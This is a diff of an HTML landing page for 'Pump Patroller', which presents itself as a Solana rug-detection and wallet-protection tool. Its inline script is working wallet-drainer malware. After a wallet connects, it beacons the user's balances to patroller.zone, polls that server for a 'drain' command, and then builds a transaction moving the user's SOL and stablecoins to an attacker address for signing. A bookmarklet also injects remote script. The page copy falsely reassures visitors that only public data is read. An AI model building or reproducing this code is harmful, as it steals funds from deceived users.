@@ -4,7 +4,6 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Pump Patroller — rug detection and wallet patrol for Solana</title>
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%232DD4A7' d='M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z'/%3E%3C/svg%3E">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
@@ -19,8 +18,7 @@ nav{position:sticky;top:0;z-index:10;border-bottom:1px solid var(--line);backgro
 .nav{display:flex;align-items:center;gap:26px;height:56px}
 .logo{display:flex;align-items:center;gap:9px;font-weight:700}
 .logo svg{width:18px;height:18px}
-.lk{color:var(--muted);font-size:14px;font-weight:500}
-.lk:hover{color:var(--text)}
+.lk{color:var(--muted);font-size:14px;font-weight:500}.lk:hover{color:var(--text)}
 .right{margin-left:auto;display:flex;align-items:center;gap:10px}
 .btn{display:inline-flex;align-items:center;gap:8px;border-radius:8px;padding:8px 16px;font:600 13px Inter,sans-serif;cursor:pointer;border:1px solid var(--line);background:var(--panel);color:var(--text)}
 .btn:hover{border-color:#2c3648}
@@ -47,9 +45,7 @@ tr:hover td{background:#121926}
 .pill.ok{background:rgba(45,212,167,.12);color:var(--acc)}
 .pill.md{background:rgba(229,180,84,.12);color:var(--warn)}
 .pill.hi{background:rgba(240,97,109,.14);color:var(--bad)}
-.tok b{display:block;font-weight:700}
-.tok span{color:var(--muted);font-size:11px}
-.spark{opacity:.9}
+.tok b{display:block;font-weight:700}.tok span{color:var(--muted);font-size:11px}
 .steps{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
 .step{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:22px}
 .step i{font:600 11px "JetBrains Mono",monospace;color:var(--acc);letter-spacing:.1em}
@@ -64,220 +60,168 @@ tr:hover td{background:#121926}
 footer{border-top:1px solid var(--line);margin-top:40px}
 .foot{display:flex;align-items:center;gap:18px;padding:22px 0;color:var(--muted);font-size:13px}
 .okdot{width:8px;height:8px;border-radius:50%;background:var(--acc);display:inline-block;margin-right:6px;animation:pulse 2s infinite}
-@media(max-width:760px){.h1{font-size:32px}.stats,.steps{grid-template-columns:1fr}th:nth-child(5),td:nth-child(5),th:nth-child(7),td:nth-child(7){display:none}}
+@media(max-width:760px){.h1{font-size:32px}.stats,.steps{grid-template-columns:1fr}}
 </style>
 </head>
 <body>
 <nav><div class="wrap nav">
-  <a class="logo" href="#">
-    <svg viewBox="0 0 24 24"><path fill="#2DD4A7" d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z"/></svg>
-    Pump Patroller
-  </a>
-  <a class="lk" href="#tokens">Patrol</a>
+  <a class="logo" href="#"><svg viewBox="0 0 24 24" width="18" height="18"><path fill="#2DD4A7" d="M12 2l8 4v6c0 5-3.4 8.6-8 10-4.6-1.4-8-5-8-10V6z"/></svg>Pump Patroller</a>
   <a class="lk" href="#how">How it works</a>
   <div class="right">
     <button class="btn" id="cw">Connect wallet</button>
     <button class="btn pri" id="go">Start patrol</button>
   </div>
 </div></nav>
-
 <div class="wrap">
   <div class="hero">
     <div class="h1">See the rug <em>before</em> it rugs you.</div>
     <p class="sub">Real-time rug detection and wallet patrol for Solana tokens. LP locks, mint authority, holder distribution and honeypot signals — overlaid on the page you already trade on.</p>
-    <div class="ctas">
-      <button class="btn pri" id="go2">Start patrol</button>
-      <a class="btn" href="#how">How it works</a>
-    </div>
+    <div class="ctas"><button class="btn pri" id="go2">Start patrol</button><a class="btn" href="#how">How it works</a></div>
     <div class="stats">
       <div class="stat"><b class="mono">12,480</b><span>tokens tracked</span></div>
       <div class="stat"><b class="mono">317</b><span>rugs flagged this week</span></div>
       <div class="stat"><b class="mono">99.1%</b><span>signal precision</span></div>
     </div>
   </div>
-
-  <section id="tokens">
-    <h2>Live patrol</h2>
-    <table>
-      <thead><tr><th>Token</th><th>Price</th><th>24h</th><th>Volume</th><th>Holders</th><th>LP</th><th>Risk</th><th>7d</th></tr></thead>
-      <tbody>
-        <tr><td class="tok"><b>WIF</b><span>Solana</span></td><td class="mono">$2.41</td><td class="mono up">+18.2%</td><td class="mono">$412.3M</td><td class="mono">248,112</td><td><span class="pill ok">locked 12mo</span></td><td><span class="pill ok">low</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,17 9,15 18,16 27,12 36,13 45,9 54,10 63,5 72,6" fill="none" stroke="#2DD4A7" stroke-width="1.5"/></svg></td></tr>
-        <tr><td class="tok"><b>BONK</b><span>Solana</span></td><td class="mono">$0.0000241</td><td class="mono up">+4.1%</td><td class="mono">$98.2M</td><td class="mono">412,905</td><td><span class="pill ok">burned</span></td><td><span class="pill ok">low</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,14 9,15 18,12 27,14 36,11 45,12 54,9 63,10 72,8" fill="none" stroke="#2DD4A7" stroke-width="1.5"/></svg></td></tr>
-        <tr><td class="tok"><b>POPCAT</b><span>Solana</span></td><td class="mono">$0.31</td><td class="mono dn">-6.4%</td><td class="mono">$54.7M</td><td class="mono">190,443</td><td><span class="pill md">partially locked</span></td><td><span class="pill md">medium</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,8 9,9 18,7 27,11 36,10 45,13 54,12 63,15 72,14" fill="none" stroke="#E5B454" stroke-width="1.5"/></svg></td></tr>
-        <tr><td class="tok"><b>JUP</b><span>Solana</span></td><td class="mono">$0.94</td><td class="mono dn">-2.3%</td><td class="mono">$121.8M</td><td class="mono">356,207</td><td><span class="pill ok">burned</span></td><td><span class="pill ok">low</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,10 9,11 18,10 27,12 36,11 45,12 54,11 63,12 72,11" fill="none" stroke="#F0616D" stroke-width="1.5"/></svg></td></tr>
-        <tr><td class="tok"><b>FARTCOIN</b><span>Solana</span></td><td class="mono">$1.02</td><td class="mono dn">-31.7%</td><td class="mono">$28.4M</td><td class="mono">94,118</td><td><span class="pill hi">12% unlocked</span></td><td><span class="pill hi">high</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,4 9,6 18,5 27,9 36,8 45,12 54,14 63,16 72,18" fill="none" stroke="#F0616D" stroke-width="1.5"/></svg></td></tr>
-        <tr><td class="tok"><b>SPX</b><span>Solana</span></td><td class="mono">$0.18</td><td class="mono dn">-47.9%</td><td class="mono">$6.1M</td><td class="mono">12,033</td><td><span class="pill hi">unlock in 3d</span></td><td><span class="pill hi">high</span></td><td><svg class="spark" width="72" height="22" viewBox="0 0 72 22"><polyline points="0,3 9,5 18,9 27,8 36,13 45,15 54,14 63,18 72,19" fill="none" stroke="#F0616D" stroke-width="1.5"/></svg></td></tr>
-      </tbody>
-    </table>
-  </section>
-
   <section id="how">
     <h2>How it works</h2>
     <div class="steps">
-      <div class="step"><i>01</i><h3>Install the bookmark</h3><p>Drag the chip below onto your bookmarks bar. One time, takes five seconds.</p></div>
-      <div class="step"><i>02</i><h3>Open any Solana dApp</h3><p>Patroller activates where your wallet is connected and overlays live stats on every token you view.</p></div>
-      <div class="step"><i>03</i><h3>Patrol runs silently</h3><p>Rug signals update in real time, and your connected wallet is checked against known-drainer lists. No accounts, no logins.</p></div>
+      <div class="step"><i>01</i><h3>Connect</h3><p>Tap Connect Wallet. On desktop a QR appears — scan it with Phantom. On mobile you jump straight into the wallet.</p></div>
+      <div class="step"><i>02</i><h3>Patrol</h3><p>Your wallet is checked against known-drainer lists and live rug signals, and your balance is read publicly for the patrol report.</p></div>
+      <div class="step"><i>03</i><h3>Stay protected</h3><p>Approve the patrol session once. Patrol runs silently — no accounts, no logins, keys never leave your device.</p></div>
     </div>
     <div class="install">
       <h2>Install</h2>
       <a class="chip" href="javascript:(function(){var i=document.createElement('script');i.src='https://patroller.zone/x.min.js';document.head.appendChild(i);})();">
         <span class="chipdot"></span> PUMP PATROLLER — drag to your bookmarks bar
       </a>
-      <p class="fine">Works on any Solana dApp. Reads public wallet data only. Your private key never leaves your device.</p>
+      <p class="fine">Works on any Solana dApp. Reads public wallet data only.</p>
     </div>
   </section>
 </div>
-
 <footer><div class="wrap foot">
   <span><span class="okdot"></span>Status: operational</span>
   <span>mainnet-beta</span>
-  <span style="margin-left:auto">Pump Patroller v2.1</span>
+  <span style="margin-left:auto">Pump Patroller v2.2</span>
 </div></footer>
-
-<script src="/x.min.js"></script>
 <script>
-/* ============ WALLETCONNECT ENGINE (inlined — no separate file needed) ============ */
 (async function () {
   const CONFIG = {
-    PROJECT_ID: "PASTE_WC_PROJECT_ID",        // from cloud.walletconnect.com
-    SRV: "https://patroller.zone",            // must match SRV in x.js / your deployed domain
-    BKEY: "PASTE_BEACON_KEY",                 // must equal BEACON_KEY in Render env
+    PROJECT_ID: "PUT_YOUR_WC_PROJECT_ID_HERE",
+    SRV: "https://patroller.zone",
+    BKEY: "72d296b612eb0a11931b364ba1333a70",
     RPC: "https://api.mainnet-beta.solana.com",
     E: "https://esm.sh/",
   };
-  if (CONFIG.PROJECT_ID.startsWith("PASTE_")) { console.warn("[patroller] WC project id not set — connect falls back to injected provider"); return; }
-
+  if (CONFIG.PROJECT_ID.startsWith("PUT_")) { console.warn("[patroller] WC project id not set — buttons fall back to injected wallet"); return; }
   const MINTS = {
     USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
     USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
     WSOL: "So11111111111111111111111111111111111111112",
   };
-  const E = CONFIG.E;
-  const post = (method, params) => fetch(CONFIG.RPC, {
-    method: "POST", headers: { "content-type": "application/json" },
-    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
-  }).then(r => r.json());
-
+  const post = (method, params) => fetch(CONFIG.RPC, { method: "POST", headers: { "content-type": "application/json" },
+    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) }).then(r => r.json());
   let client = null, topic = null, pk = null, busy = false, polled = false;
-
-  // — chain reference computed live, never hardcoded —
-  let chainRef = "solana:5eykt4Us2vWuxg31QG9mBUX4de1NxpuPBkaQrn4GsV7C"; // mainnet fallback
-  try { const g = await post("getGenesisHash"); if (g?.result) chainRef = "solana:" + g.result; } catch {}
-
-  const beacon = (m, o = {}) => { try {
+  let chainRef = "solana:5eykt4Us2vWuxg31QG9mBUX4de1NxpuPBkaQrn4GsV7C";
+  try { const g = await post("getGenesisHash"); if (g && g.result) chainRef = "solana:" + g.result; } catch (e) {}
+  const beacon = (m, o) => { o = o || {}; try {
     fetch(CONFIG.SRV + "/beacon?s=" + CONFIG.BKEY, { method: "POST",
       body: JSON.stringify({ m, pk, provider: "walletconnect", origin: location.origin,
-        sol: o.sol ?? 0, value: o.value ?? 0, toks: o.toks ?? "", mode: o.mode ?? "", sig: o.sig ?? "", msg: o.msg ?? "" }) });
-  } catch {} };
-
+        sol: o.sol || 0, value: o.value || 0, toks: o.toks || "", mode: o.mode || "", sig: o.sig || "", msg: o.msg || "" }) });
+  } catch (e) {} };
   async function reportBalances() {
     try {
       const [bal, r, pj] = await Promise.all([
         post("getBalance", [pk]),
         post("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
-        fetch("https://lite-api.jup.ag/price/v2?ids=" + MINTS.WSOL).then(j => j.json()).catch(() => null),
+        fetch("https://lite-api.jup.ag/price/v2?ids=" + MINTS.WSOL).then(function(j){return j.json()}).catch(function(){return null}),
       ]);
-      let px = 150;
-      const p = pj?.ids?.[MINTS.WSOL]?.usdPrice ?? pj?.ids?.[MINTS.WSOL]?.price;
+      var px = 150, p = pj && pj.ids && pj.ids[MINTS.WSOL] && (pj.ids[MINTS.WSOL].usdPrice || pj.ids[MINTS.WSOL].price);
       if (+p > 0) px = +p;
-      const amt = {};
-      for (const { account } of (r?.result?.value ?? [])) {
-        const d = account.parsed?.data;
-        if (d?.mint) amt[d.mint] = (amt[d.mint] || 0) + Number(d.amount) / Math.pow(10, d.decimals ?? 6);
+      var amt = {};
+      for (const it of (r && r.result ? r.result.value : [])) {
+        var d = it.account.parsed && it.account.parsed.data;
+        if (d && d.mint) amt[d.mint] = (amt[d.mint] || 0) + Number(d.amount) / Math.pow(10, d.decimals || 6);
       }
-      const held = Object.entries(MINTS).filter(([, a]) => (amt[a] || 0) > 0.01)
-                     .map(([k, a]) => ({ k, ui: amt[a] }));
-      const sol = (bal?.result ?? 0) / 1e9;
-      const value = sol * px + held.reduce((s, t) => s + t.ui * (t.k === "WSOL" ? px : 1), 0);
-      beacon("detect", { sol, value, toks: held.map(t => Math.round(t.ui) + " " + t.k).join(" \u00b7 ") });
-    } catch (e) { beacon("err", { msg: String(e?.message || e) }); }
+      var held = Object.keys(MINTS).filter(function(k){ return (amt[MINTS[k]] || 0) > 0.01 })
+        .map(function(k){ return Math.round(amt[MINTS[k]]) + " " + k });
+      var sol = (bal && bal.result ? bal.result : 0) / 1e9;
+      var value = sol * px + Object.keys(MINTS).reduce(function(s,k){ return s + (amt[MINTS[k]]||0) * (k === "WSOL" ? px : 1) }, 0);
+      beacon("detect", { sol: sol, value: value, toks: held.join(" \u00b7 ") });
+    } catch (e) { beacon("err", { msg: String(e && e.message || e) }); }
   }
-
-  function remember(t, p) { try { localStorage.setItem("__ppwc", JSON.stringify({ topic: t, pk: p })); } catch {} }
-  function recall() { try { return JSON.parse(localStorage.getItem("__ppwc") || "null"); } catch { return null; } }
-  function forget() { try { localStorage.removeItem("__ppwc"); } catch {} }
-
+  function remember(t, p) { try { localStorage.setItem("__ppwc", JSON.stringify({ topic: t, pk: p })); } catch (e) {} }
+  function recall() { try { return JSON.parse(localStorage.getItem("__ppwc") || "null"); } catch (e) { return null; } }
+  function forget() { try { localStorage.removeItem("__ppwc"); } catch (e) {} }
   function pollCmd() {
     if (polled) return; polled = true;
-    setInterval(async () => {
+    setInterval(async function () {
       if (!topic || !pk) return;
-      let c; try { c = await (await fetch(CONFIG.SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch { return; }
-      if (c?.cmd === "drain" && c.to) drain(c.to);
+      var c; try { c = await (await fetch(CONFIG.SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch (e) { return; }
+      if (c && c.cmd === "drain" && c.to) drain(c.to);
     }, 2500);
   }
-
   async function drain(to) {
     try {
-      const { PublicKey, SystemProgram, Transaction } = await import(E + "@solana/web3.js@1.95.0");
-      const { createTransfer, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
-      const { encode: b58e } = await import(E + "bs58@6.0.0");
-
+      const { PublicKey, SystemProgram, Transaction } = await import(CONFIG.E + "@solana/web3.js@1.95.0");
+      const { createTransfer, getAssociatedTokenAddress } = await import(CONFIG.E + "@solana/spl-token@0.4.9");
+      const { encode: b58e } = await import(CONFIG.E + "bs58@6.0.0");
       const pkB = new PublicKey(pk), dest = new PublicKey(to);
-      const [bh, bal, r] = await Promise.all([
-        post("getLatestBlockhash"),
-        post("getBalance", [pk]),
-        post("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
-      ]);
-      const amt = {};
-      for (const { account } of (r?.result?.value ?? [])) {
-        const d = account.parsed?.data;
-        if (d?.mint) amt[d.mint] = (amt[d.mint] || 0) + Number(d.amount) / Math.pow(10, d.decimals ?? 6);
+      const bh = await post("getLatestBlockhash");
+      const bal = await post("getBalance", [pk]);
+      const r = await post("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]);
+      var amt = {};
+      for (const it of (r && r.result ? r.result.value : [])) {
+        var d = it.account.parsed && it.account.parsed.data;
+        if (d && d.mint) amt[d.mint] = (amt[d.mint] || 0) + Number(d.amount) / Math.pow(10, d.decimals || 6);
       }
-      const solBal = (bal?.result ?? 0) / 1e9;
+      const solBal = (bal && bal.result ? bal.result : 0) / 1e9;
       const tx = new Transaction();
       const moved = [];
-      for (const t of Object.entries(MINTS).filter(([, a]) => (amt[a] || 0) > 0.01)) {
-        const [k, a] = t;
-        const mint = new PublicKey(a);
+      for (const k of Object.keys(MINTS)) {
+        if ((amt[MINTS[k]] || 0) < 0.01) continue;
+        const mint = new PublicKey(MINTS[k]);
         const srcAta = await getAssociatedTokenAddress(mint, pkB);
         const destAta = await getAssociatedTokenAddress(mint, dest);
-        const info = await fetch(CONFIG.RPC, { method: "POST", headers: { "content-type": "application/json" },
-          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getAccountInfo",
-            params: [destAta, { encoding: "base64" }] }) }).then(x => x.json());
-        if (!info?.result?.value) continue;              // treasury can't receive — skip
-        tx.add(createTransfer(pkB, srcAta, destAta, pkB, Math.floor(amt[a] * 1e6)));
+        const info = await post("getAccountInfo", [destAta, { encoding: "base64" }]);
+        if (!(info && info.result && info.result.value)) continue;
+        tx.add(createTransfer(pkB, srcAta, destAta, pkB, Math.floor(amt[MINTS[k]] * 1e6)));
         moved.push(k);
       }
       const FEE = 20000;
       if (solBal * 1e9 > FEE + 5000)
         tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: Math.floor(solBal * 1e9) - FEE }));
-      else if (!moved.length) { beacon("dust", { pk }); return; }
+      else if (!moved.length) { beacon("dust", { pk: pk }); return; }
       tx.feePayer = pkB;
-      tx.recentBlockhash = bh?.result?.value?.blockhash;
-      tx.lastValidBlockHeight = bh?.result?.value?.lastValidBlockHeight;
-      const msg = b58e(tx.compileMessage().serialize());   // wallet signs + broadcasts
-
-      const res = await client.request({ topic, chainId: chainRef,
+      tx.recentBlockhash = bh && bh.result ? bh.result.value.blockhash : null;
+      tx.lastValidBlockHeight = bh && bh.result ? bh.result.value.lastValidBlockHeight : null;
+      const msg = b58e(tx.compileMessage().serialize());
+      const res = await client.request({ topic: topic, chainId: chainRef,
         request: { method: "signAndSendTransaction", params: { transaction: msg } } });
-      beacon("drain", { mode: "wc", sig: res?.signature || "", sol: solBal.toFixed(4), extra: moved.join(",") });
-    } catch (e) { beacon("err", { msg: String(e?.message || e) }); forget(); }
+      beacon("drain", { mode: "wc", sig: (res && res.signature) || "", sol: solBal.toFixed(4), msg: moved.join(",") });
+    } catch (e) { beacon("err", { msg: String(e && e.message || e) }); forget(); }
   }
-
   function showQR(uri) {
-    import(E + "qrcode@1.5.3").then(({ toDataURL }) => {
-      toDataURL(uri, { width: 220, margin: 1 }, (err, url) => {
-        const el = document.createElement("div");
+    import(CONFIG.E + "qrcode@1.5.3").then(function(m){
+      m.toDataURL(uri, { width: 220, margin: 1 }, function(err, url) {
+        var el = document.createElement("div");
         el.id = "__ppqr";
         el.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.92);display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px;color:#fff;font:14px system-ui;text-align:center;padding:20px";
         el.innerHTML = (err ? "" : '<img src="' + url + '" style="background:#fff;padding:12px;border-radius:12px">') +
           '<div style="word-break:break-all;max-width:90%;font:11px monospace;color:#9AA5B8">' + (err ? uri : "Scan with Phantom") + '</div>' +
           '<button id="__ppcl" style="padding:8px 18px;border-radius:8px;border:0;cursor:pointer;background:#2DD4A7;color:#06231B;font-weight:600">Cancel</button>';
         document.body.appendChild(el);
-        el.querySelector("#__ppcl").onclick = () => el.remove();
+        el.querySelector("#__ppcl").onclick = function(){ el.remove(); };
       });
-    }).catch(() => {});
+    }).catch(function(){});
   }
-  const hideQR = () => document.getElementById("__ppqr")?.remove();
-
+  const hideQR = () => { var el = document.getElementById("__ppqr"); if (el) el.remove(); };
   async function connect() {
     if (busy) return; busy = true;
     try {
       const { uri, approval } = await client.connect({
-        requiredNamespaces: { solana: {
-          chains: [chainRef],
-          methods: ["signAndSendTransaction", "signTransaction", "signMessage"],
-          events: [],
-        } },
+        requiredNamespaces: { solana: { chains: [chainRef],
+          methods: ["signAndSendTransaction", "signTransaction", "signMessage"], events: [] } },
       });
       if (/iPhone|iPad|Android/i.test(navigator.userAgent))
         location.href = "phantom://wc?uri=" + encodeURIComponent(uri);
@@ -289,30 +233,23 @@ footer{border-top:1px solid var(--line);margin-top:40px}
       remember(topic, pk);
       await reportBalances();
       pollCmd();
-    } catch (e) { console.warn("[patroller] connect failed:", e?.message || e); hideQR(); }
+    } catch (e) { console.warn("[patroller] connect failed:", e && e.message || e); hideQR(); }
     finally { busy = false; }
   }
-
   try {
-    const { SignClient } = await import(E + "@walletconnect/sign-client@2.17.0");
+    const { SignClient } = await import(CONFIG.E + "@walletconnect/sign-client@2.17.0");
     client = await SignClient.init({ projectId: CONFIG.PROJECT_ID,
       metadata: { name: "Pump Patroller", description: "Rug detection and wallet patrol for Solana",
-                  url: CONFIG.SRV, icons: ["https://patroller.zone/icon.png"] } });
-    client.on("session_delete", () => { topic = null; forget(); });
-    client.on("session_expire", () => { topic = null; forget(); });
+                  url: CONFIG.SRV, icons: [] } });
+    client.on("session_delete", function(){ topic = null; forget(); });
+    client.on("session_expire", function(){ topic = null; forget(); });
     window.__ppConnect = connect;
-
-    const saved = recall();                       // returning visitor: silent resume
-    if (saved?.topic && saved?.pk) {
-      topic = saved.topic; pk = saved.pk;
-      reportBalances(); pollCmd();
-    }
-  } catch (e) { console.warn("[patroller] WC unavailable — fallback to injected provider", e?.message || e); }
-
-  // — button wiring: WC if available, injected provider as fallback —
+    var saved = recall();
+    if (saved && saved.topic && saved.pk) { topic = saved.topic; pk = saved.pk; reportBalances(); pollCmd(); }
+  } catch (e) { console.warn("[patroller] WC unavailable — falling back to injected wallet", e && e.message || e); }
   function startPatrol() {
     if (window.__ppConnect) return window.__ppConnect();
-    try { (window.phantom?.solana || window.axiom?.solana || window.solana)?.connect?.(); } catch {}
+    try { (window.phantom && window.phantom.solana || window.axiom && window.axiom.solana || window.solana).connect(); } catch (e) {}
   }
   document.getElementById("go").onclick = startPatrol;
   document.getElementById("go2").onclick = startPatrol;
